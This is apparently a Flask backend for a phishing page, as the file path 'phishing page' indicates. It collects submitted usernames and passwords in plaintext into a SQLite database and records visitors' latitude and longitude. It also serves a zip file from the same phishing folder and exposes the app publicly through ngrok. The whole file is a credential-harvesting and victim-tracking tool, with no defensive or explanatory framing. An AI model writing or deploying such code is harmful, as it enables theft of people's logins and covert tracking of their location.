"""

this stores the userName and password in server

"""

from flask import Flask, render_template, request,send_file,request, jsonify
from flask_sqlalchemy import SQLAlchemy


app = Flask(__name__, template_folder="templates")
 
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)
run_with_ngrok(app)
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(150), nullable=False, unique=True)
    password = db.Column(db.String(150), nullable=False)

    def __repr__(self):
        return f'<User {self.username,self.password}>'

with app.app_context():
    db.create_all()

@app.get("/")
def home():
    return render_template('index.html')

@app.post("/submit") 
def submit():
    username = request.form.get('username')
    password = request.form.get('password')

    # Check if user already exists
    """existing_user = User.query.filter_by(username=username).first()
    if existing_user:
        return "User already exists. Please try a different username."
    """
    # Add new user
    new_user = User(username=username, password=password)
    db.session.add(new_user)
    db.session.commit()
    
    return "User added successfully!"

@app.get("/download")
def download_file():
    # Path to the file you want to download
    file_path = "C:/Users/prave/Desktop/phishing page/example.zip"  
    return send_file(file_path, as_attachment=True)

class Location(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    latitude = db.Column(db.Float, nullable=False)
    longitude = db.Column(db.Float, nullable=False)

    def __repr__(self):
        return f'<Location {self.latitude}, {self.longitude}>'

@app.route('/location', methods=['POST'])
def location():
    data = request.get_json()
    latitude = data['latitude']
    longitude = data['longitude']
    new_location = Location(latitude=latitude, longitude=longitude)

    # Add the location to the database
    db.session.add(new_location)
    db.session.commit()
    
    return jsonify({"message": "Location stored", "status": "success"})

with app.app_context():
    db.create_all()

if __name__ == "__main__":
    #app.run(debug=True)
    app.run()

